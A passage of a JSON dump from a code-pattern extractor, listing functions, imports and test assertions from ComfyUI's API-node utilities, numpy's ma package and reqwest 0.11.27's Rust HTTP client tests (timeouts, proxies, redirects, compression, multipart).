          "def _snapshot_request_body_for_logging(",
          "def _validate_or_raise(response_model: type[M], payload: Any) -> M:",
          "def _wrap_model_extractor(",
          "def _wrapped(d: dict[str, Any]) -> Any:",
          "def _normalize_statuses(values: Iterable[str | int] | None) -> set[str | int]:",
          "def _normalize_status_value(val: str | int | None) -> str | int | None:"
        ],
        "class_defs": [
          "class ApiEndpoint:",
          "class _RequestConfig:",
          "class _PollUIState:"
        ],
        "imports": [
          "import asyncio",
          "import contextlib",
          "import json",
          "import logging",
          "import time",
          "import uuid",
          "from collections.abc import Callable, Iterable",
          "from dataclasses import dataclass",
          "from enum import Enum",
          "from io import BytesIO",
          "from typing import Any, Literal, TypeVar",
          "from urllib.parse import urljoin, urlparse",
          "import aiohttp",
          "from aiohttp.client_exceptions import ClientError, ContentTypeError",
          "from pydantic import BaseModel",
          "from comfy import utils",
          "from comfy_api.latest import IO",
          "from server import PromptServer",
          "from . import request_logger",
          "from ._helpers import (",
          "from .common_exceptions import ApiServerError, LocalNetworkError, ProcessingInterrupted"
        ],
        "comments": [
          "# aiohttp will set Content-Type boundary; remove any fixed Content-Type",
          "# Attempt to rewind BytesIO for retries",
          "# Race: request vs. monitor (interruption)",
          "# Interrupted \u2013 cancel the request and abort",
          "# Otherwise, request finished"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 59,
        "decorators": [
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/download_helpers.py",
        "docstrings": [],
        "function_defs": [
          "def _generate_operation_id(method: str, url: str, attempt: int) -> str:"
        ],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import contextlib",
          "import uuid",
          "from io import BytesIO",
          "from pathlib import Path",
          "from typing import IO",
          "from urllib.parse import urljoin, urlparse",
          "import aiohttp",
          "import torch",
          "from aiohttp.client_exceptions import ClientError, ContentTypeError",
          "from comfy_api.latest import IO as COMFY_IO",
          "from comfy_api.latest import InputImpl",
          "from . import request_logger",
          "from ._helpers import (",
          "from .client import _diagnose_connectivity",
          "from .common_exceptions import ApiServerError, LocalNetworkError, ProcessingInterrupted",
          "from .conversions import bytesio_to_image_tensor"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 24,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from ._helpers import get_fs_object_size",
          "from .client import (",
          "from .conversions import (",
          "from .download_helpers import (",
          "from .upload_helpers import (",
          "from .validation_utils import ("
        ],
        "comments": [
          "# API client",
          "# Upload helpers",
          "# Download helpers",
          "# Conversions",
          "# Validation utilities",
          "# Misc functions"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/common_exceptions.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class NetworkError(Exception):",
          "class LocalNetworkError(NetworkError):",
          "class ApiServerError(NetworkError):",
          "class ProcessingInterrupted(Exception):"
        ],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/validation_utils.py",
        "docstrings": [],
        "function_defs": [
          "def get_image_dimensions(image: torch.Tensor) -> tuple[int, int]:",
          "def validate_image_dimensions(",
          "def validate_image_aspect_ratio(",
          "def validate_images_aspect_ratio_closeness(",
          "def validate_aspect_ratio_string(",
          "def validate_video_dimensions(",
          "def validate_video_duration(",
          "def validate_video_frame_count(",
          "def get_number_of_images(images):",
          "def validate_audio_duration(",
          "def validate_string(",
          "def validate_container_format_is_mp4(video: Input.Video) -> None:\n\"\"\"Validates video container format is MP4.\"\"\"\ncontainer_format = video.get_container_format()\nif container_format not in [\"mp4\", \"mov,mp4,m4a,3gp,3g2,mj2\"]:\nraise ValueError(f\"Only MP4 container format supported. Got: {container_format}\")\n\n\ndef _ratio_from_tuple(r: tuple[float, float]) -> float:\na, b = r\nif a <= 0 or b <= 0:",
          "def _ratio_from_tuple(r: tuple[float, float]) -> float:",
          "def _assert_ratio_bounds(",
          "def _parse_aspect_ratio_string(ar_str: str) -> float:\n\"\"\"Parse 'X:Y' with integer parts into a positive float ratio X/Y.\"\"\"\nparts = ar_str.split(\":\")\nif len(parts) != 2:\nraise ValueError(f\"Aspect ratio must be 'X:Y' (e.g., 16:9), got '{ar_str}'.\")\ntry:\na = int(parts[0].strip())\nb = int(parts[1].strip())\nexcept ValueError as exc:\nraise ValueError(f\"Aspect ratio must contain integers separated by ':', got '{ar_str}'.\") from exc"
        ],
        "class_defs": [],
        "imports": [
          "import logging",
          "import torch",
          "from comfy_api.latest import Input"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 36,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/_helpers.py",
        "docstrings": [],
        "function_defs": [
          "def is_processing_interrupted() -> bool:\n\"\"\"Return True if user/runtime requested interruption.\"\"\"\nreturn processing_interrupted()\n\n\ndef get_node_id(node_cls: type[IO.ComfyNode]) -> str:\nreturn node_cls.hidden.unique_id\n\n\ndef get_auth_header(node_cls: type[IO.ComfyNode]) -> dict[str, str]:",
          "def get_node_id(node_cls: type[IO.ComfyNode]) -> str:",
          "def get_auth_header(node_cls: type[IO.ComfyNode]) -> dict[str, str]:",
          "def default_base_url() -> str:",
          "def mimetype_to_extension(mime_type: str) -> str:\n\"\"\"Converts a MIME type to a file extension.\"\"\"\nreturn mime_type.split(\"/\")[-1].lower()\n\n\ndef get_fs_object_size(path_or_object: str | BytesIO) -> int:\nif isinstance(path_or_object, str):\nreturn os.path.getsize(path_or_object)\nreturn len(path_or_object.getvalue())\n",
          "def get_fs_object_size(path_or_object: str | BytesIO) -> int:",
          "def to_aiohttp_url(url: str) -> URL:\n\"\"\"If `url` appears to be already percent-encoded (contains at least one valid %HH\nescape and no malformed '%' sequences) and contains no raw whitespace/control\ncharacters preserve the original encoding byte-for-byte (important for signed/presigned URLs).\nOtherwise, return `URL(url)` and allow yarl to normalize/quote as needed.\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import contextlib",
          "import os",
          "import re",
          "import time",
          "from collections.abc import Callable",
          "from io import BytesIO",
          "from yarl import URL",
          "from comfy.cli_args import args",
          "from comfy.model_management import processing_interrupted",
          "from comfy_api.latest import IO",
          "from .common_exceptions import ProcessingInterrupted"
        ],
        "comments": [
          "# Avoid encoded=True if URL contains raw whitespace/control chars",
          "# Preserve encoding only if it appears pre-encoded AND has no invalid % sequences"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/ma",
    "name": "ma",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/ma",
    "name": "ma",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27",
    "name": "reqwest-0.11.27",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/upgrade.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use support::server;",
          "use tokio::io::{AsyncReadExt, AsyncWriteExt};"
        ],
        "macros": [
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.headers()[\"connection\"], \"upgrade\");",
          "assert_eq!(req.headers()[\"upgrade\"], \"foobar\");",
          "assert_eq!(buf, b\"foo=bar\");",
          ".get(format!(\"http://{}\", server.addr()))",
          "assert_eq!(res.status(), http::StatusCode::SWITCHING_PROTOCOLS);",
          "assert_eq!(buf, b\"bar=foo\");"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/badssl.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "assert!(text.contains(\"<title>mozilla-modern.badssl.com</title>\"));",
          "assert!(text.contains(\"<title>mozilla-modern.badssl.com</title>\"));",
          "assert!(text.contains(\"<title>self-signed.badssl.com</title>\"));",
          "assert!(result.is_err());",
          "assert!(text.contains(\"<title>wrong.host.badssl.com</title>\"));",
          "assert!(result.is_err());"
        ],
        "derives": [],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/timeouts.rs",
        "function_defs": [
          "fn timeout_closes_connection() {",
          "fn timeout_blocking_request() {",
          "fn blocking_request_timeout_body() {",
          "fn write_timeout_large_body() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use support::server;",
          "use std::time::Duration;"
        ],
        "macros": [
          "let url = format!(\"http://{}/slow\", server.addr());",
          "assert!(err.is_timeout());",
          "assert_eq!(err.url().map(|u| u.as_str()), Some(url.as_str()));",
          "let url = format!(\"http://{}/slow\", server.addr());",
          "if cfg!(not(target_arch = \"wasm32\")) {",
          "assert!(err.is_timeout() && !err.is_connect());",
          "assert!(err.is_timeout());",
          "assert_eq!(err.url().map(|u| u.as_str()), Some(url.as_str()));",
          "assert!(err.is_connect() && err.is_timeout());",
          "let url = format!(\"http://many_addrs:{port}/eventual\");",
          "assert!(err.is_connect() && err.is_timeout());",
          "let url = format!(\"http://{}/slow\", server.addr());",
          "assert!(err.is_timeout());",
          "let url = format!(\"http://{}/closes\", server.addr());",
          "assert!(err.is_timeout());",
          "assert_eq!(err.url().map(|u| u.as_str()), Some(url.as_str()));",
          "let url = format!(\"http://{}/closes\", server.addr());",
          "assert!(err.is_timeout());",
          "assert_eq!(err.url().map(|u| u.as_str()), Some(url.as_str()));",
          "let url = format!(\"http://{}/closes\", server.addr());",
          "assert_eq!(text, \"Hello\");",
          "let url = format!(\"http://{}/write-timeout\", server.addr());",
          "assert!(err.is_timeout());",
          "assert_eq!(err.url().map(|u| u.as_str()), Some(url.as_str()));"
        ],
        "derives": [],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/proxy.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use support::server;",
          "use std::env;"
        ],
        "macros": [
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"hyper.rs\");",
          "let proxy = format!(\"http://{}\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"hyper.rs\");",
          "assert_eq!(",
          "let proxy = format!(\"http://{}\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"hyper.rs\");",
          "assert_eq!(",
          "let proxy = format!(\"http://Aladdin:open sesame@{}\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"hyper.rs\");",
          "assert_eq!(",
          "format!(\"http://Aladdin:open sesame@{}\", server.addr()),",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), \"/4\");",
          "let proxy = format!(\"http://{}\", server.addr());",
          "let url = format!(\"http://{}/4\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"not.a.real.sub.hyper.rs\");",
          "env::set_var(\"http_proxy\", format!(\"http://{}\", server.addr()));",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.uri(), url);",
          "assert_eq!(req.headers()[\"host\"], \"hyper.rs\");",
          "let proxy = format!(\"http://{}\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);"
        ],
        "derives": [],
        "error_handling": 20
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/redirect.rs",
        "function_defs": [
          "fn test_redirect_307_does_not_try_if_reader_cannot_reset() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use futures_util::stream::StreamExt;",
          "use hyper::Body;",
          "use support::server;",
          "use tokio::sync::watch;"
        ],
        "macros": [
          "assert_eq!(req.uri(), &*format!(\"/{code}\"));",
          "assert_eq!(req.method(), \"GET\");",
          "let url = format!(\"http://{}/{}\", redirect.addr(), code);",
          "let dst = format!(\"http://{}/{}\", redirect.addr(), \"dst\");",
          "assert_eq!(res.url().as_str(), dst);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(",
          "assert_eq!(req.method(), \"GET\");",
          "if req.uri() == &*format!(\"/{code}\") {",
          "assert_eq!(req.uri(), \"/dst\");",
          "let url = format!(\"http://{}/{}\", redirect.addr(), code);",
          "let dst = format!(\"http://{}/{}\", redirect.addr(), \"dst\");",
          "assert_eq!(res.url().as_str(), dst);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-length\"], \"5\");",
          "assert_eq!(&*data, b\"Hello\");",
          "if req.uri() == &*format!(\"/{code}\") {",
          "assert_eq!(req.uri(), \"/dst\");",
          "let url = format!(\"http://{}/{}\", redirect.addr(), code);",
          "let dst = format!(\"http://{}/{}\", redirect.addr(), \"dst\");",
          "assert_eq!(res.url().as_str(), dst);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.uri(), &*format!(\"/{code}\"));",
          "assert_eq!(req.headers()[\"transfer-encoding\"], \"chunked\");",
          "assert_eq!(&*data, b\"Hello\");",
          "let url = format!(\"http://{}/{}\", redirect.addr(), code);",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), code);",
          "assert_eq!(req.headers().get(\"cookie\"), None);",
          "assert_eq!(",
          "format!(\"http://{mid_addr}/sensitive\")",
          "assert_eq!(req.headers()[\"cookie\"], \"foo=bar\");",
          ".header(\"location\", format!(\"http://{end_addr}/end\"))",
          ".get(&format!(\"http://{}/sensitive\", mid_server.addr()))",
          "assert_eq!(req.uri(), \"/loop\");",
          "let url = format!(\"http://{}/loop\", server.addr());",
          "assert!(err.is_redirect());",
          "assert_eq!(req.uri(), \"/no-redirect\");",
          "let url = format!(\"http://{}/no-redirect\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::FOUND);",
          "assert_eq!(req.uri(), \"/dst\");",
          "assert_eq!(req.headers().get(\"referer\"), None);",
          ".get(&format!(\"http://{}/no-refer\", server.addr()))",
          "let url = format!(\"http://{}/yikes\", server.addr());",
          "assert_eq!(res.url().as_str(), url);",
          "assert_eq!(res.status(), reqwest::StatusCode::FOUND);",
          "let url = format!(\"http://{}/yikes\", server.addr());",
          "assert!(err.is_builder());",
          "assert_eq!(req.uri(), \"/dst\");",
          "assert_eq!(req.headers()[\"cookie\"], \"key=value\");",
          "let url = format!(\"http://{}/{}\", server.addr(), code);",
          "let dst = format!(\"http://{}/{}\", server.addr(), \"dst\");",
          "assert_eq!(res.url().as_str(), dst);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let url = format!(\"https://{}/yikes\", server.addr());",
          "assert!(err.is_redirect());"
        ],
        "derives": [],
        "error_handling": 36
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/wasm_simple.rs",
        "function_defs": [
          "fn log(s: &str);"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use wasm_bindgen::prelude::*;",
          "use wasm_bindgen_test::*;"
        ],
        "macros": [
          "wasm_bindgen_test::wasm_bindgen_test_configure!(run_in_browser);",
          "log(&format!(\"Status: {}\", res.status()));",
          "log(&format!(\"Body:\\n\\n{body}\"));"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/deflate.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::Write;",
          "use support::server;",
          "use futures_util::stream::StreamExt;"
        ],
        "macros": [
          "assert_eq!(req.method(), \"HEAD\");",
          ".head(&format!(\"http://{}/deflate\", server.addr()))",
          "assert_eq!(body, \"\");",
          "assert_eq!(req.headers()[\"accept\"], \"application/json\");",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/accept\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.headers()[\"accept\"], \"*/*\");",
          "assert_eq!(req.headers()[\"accept-encoding\"], \"identity\");",
          ".get(&format!(\"http://{}/accept-encoding\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          ".map(|i| format!(\"test {i}\"))",
          "Ok(n) => assert!(n > 0, \"Failed to write to encoder.\"),",
          "_ => panic!(\"Failed to deflate encode string.\"),",
          "let mut response = format!(",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/deflate\", server.addr()))",
          "assert_eq!(body, content);"
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/client.rs",
        "function_defs": [
          "fn use_preconfigured_tls_with_bogus_backend() {",
          "fn use_preconfigured_native_tls_default() {",
          "fn use_preconfigured_rustls_default() {",
          "fn add_json_default_content_type_if_not_set_manually() {",
          "fn update_json_content_type_if_set_manually() {"
        ],
        "struct_defs": [
          "struct DefinitelyNotTls;"
        ],
        "impl_blocks": [],
        "uses": [
          "use futures_util::stream::StreamExt;",
          "use support::delay_server;",
          "use support::server;",
          "use http::header::CONTENT_TYPE;",
          "use std::collections::HashMap;",
          "use reqwest::Client;"
        ],
        "macros": [
          "assert_eq!(req.method(), \"GET\");",
          "assert_eq!(req.headers()[\"accept\"], \"*/*\");",
          "assert_eq!(req.headers().get(\"user-agent\"), None);",
          "if cfg!(feature = \"gzip\") {",
          "assert!(req.headers()[\"accept-encoding\"]",
          "if cfg!(feature = \"brotli\") {",
          "assert!(req.headers()[\"accept-encoding\"]",
          "if cfg!(feature = \"deflate\") {",
          "assert!(req.headers()[\"accept-encoding\"]",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.remote_addr(), Some(server.addr()));",
          "assert_eq!(req.headers()[\"user-agent\"], \"reqwest-test-agent\");",
          "let url = format!(\"http://{}/ua\", server.addr());",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          ".get(&format!(\"http://{}/text\", server.addr()))",
          "assert_eq!(res.content_length(), Some(5));",
          "assert_eq!(\"Hello\", text);",
          ".get(&format!(\"http://{}/bytes\", server.addr()))",
          "assert_eq!(res.content_length(), Some(5));",
          "assert_eq!(\"Hello\", bytes);",
          ".get(&format!(\"http://{}/json\", server.addr()))",
          "assert_eq!(\"Hello\", text);",
          "assert_eq!(req.uri(), \"/pipe\");",
          "assert_eq!(req.headers()[\"transfer-encoding\"], \"chunked\");",
          "assert_eq!(full, b\"pipe me\");",
          ".get(&format!(\"http://{}/get\", server.addr()))",
          "assert_eq!(res1.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res1.content_length(), Some(7));",
          ".post(&format!(\"http://{}/pipe\", server.addr()))",
          "assert_eq!(res2.status(), reqwest::StatusCode::OK);",
          "let url = format!(",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(\"Hello\", text);",
          "let url = format!(",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(\"Hello\", text);",
          "let url = format!(",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(\"Hello\", text);",
          "let url = format!(",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(\"Hello\", text);",
          "let url = format!(\"https://localhost:{}\", server.addr().port());",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.version(), reqwest::Version::HTTP_2);",
          "assert!(resp.is_ok());",
          "assert!(resp.is_err());",
          "assert_eq!(content_type, req.headers().get(CONTENT_TYPE).unwrap());",
          "assert_eq!(\"application/json\", req.headers().get(CONTENT_TYPE).unwrap());",
          "assert!(tls_info.is_some());",
          "assert!(peer_certificate.is_some());",
          "assert_eq!(der[0], 0x30); // ASN.1 SEQUENCE",
          "assert!(tls_info.is_none());",
          "assert_eq!(req.version(), http::Version::HTTP_2);",
          "let url = format!(\"http://{}\", server.addr());",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.version(), http::Version::HTTP_2);",
          "let url = format!(\"http://{}\", server.addr());",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);"
        ],
        "derives": [],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/multipart.rs",
        "function_defs": [
          "fn blocking_file_part() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use futures_util::stream::StreamExt;",
          "use support::server;",
          "use futures_util::{future, stream};"
        ],
        "macros": [
          "let expected_body = format!(",
          "let ct = format!(\"multipart/form-data; boundary={}\", form.boundary());",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-type\"], ct);",
          "assert_eq!(",
          "assert_eq!(full, expected_body.as_bytes());",
          "let url = format!(\"http://{}/multipart/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let expected_body = format!(",
          "let ct = format!(\"multipart/form-data; boundary={}\", form.boundary());",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-type\"], ct);",
          "assert_eq!(req.headers()[\"transfer-encoding\"], \"chunked\");",
          "assert_eq!(full, expected_body.as_bytes());",
          "let url = format!(\"http://{}/multipart/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let expected_body = format!(",
          "let ct = format!(\"multipart/form-data; boundary={}\", form.boundary());",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-type\"], ct);",
          "assert_eq!(",
          "assert_eq!(full, expected_body.as_bytes());",
          "let url = format!(\"http://{}/multipart/2\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/gzip.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use support::server;",
          "use std::io::Write;",
          "use futures_util::stream::StreamExt;"
        ],
        "macros": [
          "assert_eq!(req.method(), \"HEAD\");",
          ".head(&format!(\"http://{}/gzip\", server.addr()))",
          "assert_eq!(body, \"\");",
          "assert_eq!(req.headers()[\"accept\"], \"application/json\");",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/accept\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.headers()[\"accept\"], \"*/*\");",
          "assert_eq!(req.headers()[\"accept-encoding\"], \"identity\");",
          ".get(&format!(\"http://{}/accept-encoding\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          ".map(|i| format!(\"test {i}\"))",
          "Ok(n) => assert!(n > 0, \"Failed to write to encoder.\"),",
          "_ => panic!(\"Failed to gzip encode string.\"),",
          "let mut response = format!(",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/gzip\", server.addr()))",
          "assert_eq!(body, content);"
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/blocking.rs",
        "function_defs": [
          "fn test_response_text() {",
          "fn test_response_non_utf_8_text() {",
          "fn test_response_json() {",
          "fn test_response_copy_to() {",
          "fn test_get() {",
          "fn test_post() {",
          "fn test_post_form() {",
          "fn test_error_for_status_4xx() {",
          "fn test_error_for_status_5xx() {",
          "fn test_default_headers() {",
          "fn test_override_default_headers() {",
          "fn test_appended_headers_not_overwritten() {",
          "fn test_blocking_inside_a_runtime() {",
          "fn test_allowed_methods_blocking() {",
          "fn test_body_from_bytes() {",
          "fn blocking_add_json_default_content_type_if_not_set_manually() {",
          "fn blocking_update_json_content_type_if_set_manually() {",
          "fn test_response_no_tls_info_for_http() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use http::header::CONTENT_TYPE;",
          "use http::HeaderValue;",
          "use std::collections::HashMap;",
          "use support::server;",
          "use reqwest::header;"
        ],
        "macros": [
          "let url = format!(\"http://{}/text\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.content_length(), Some(5));",
          "assert_eq!(b\"Hello\", body.as_bytes());",
          "let url = format!(\"http://{}/text\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.content_length(), Some(4));",
          "assert_eq!(\"\u4f60\u597d\", &body);",
          "assert_eq!(b\"\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\", body.as_bytes()); // Now it's utf-8",
          "let url = format!(\"http://{}/json\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.content_length(), Some(7));",
          "assert_eq!(\"Hello\", body);",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(dst, b\"Hello\");",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.remote_addr(), Some(server.addr()));",
          "assert_eq!(res.text().unwrap().len(), 0)",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-length\"], \"5\");",
          "assert_eq!(&*data, b\"Hello\");",
          "let url = format!(\"http://{}/2\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.method(), \"POST\");",
          "assert_eq!(req.headers()[\"content-length\"], \"24\");",
          "assert_eq!(",
          "assert_eq!(&*data, b\"hello=world&sean=monstar\");",
          "let url = format!(\"http://{}/form\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert!(err.is_status());",
          "assert_eq!(err.status(), Some(reqwest::StatusCode::BAD_REQUEST));",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert!(err.is_status());",
          "assert_eq!(",
          "assert_eq!(req.headers()[\"reqwest-test\"], \"orly\");",
          "let url = format!(\"http://{}/1\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.headers()[&http::header::AUTHORIZATION], \"secret\");",
          "let url = format!(\"http://{}/3\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
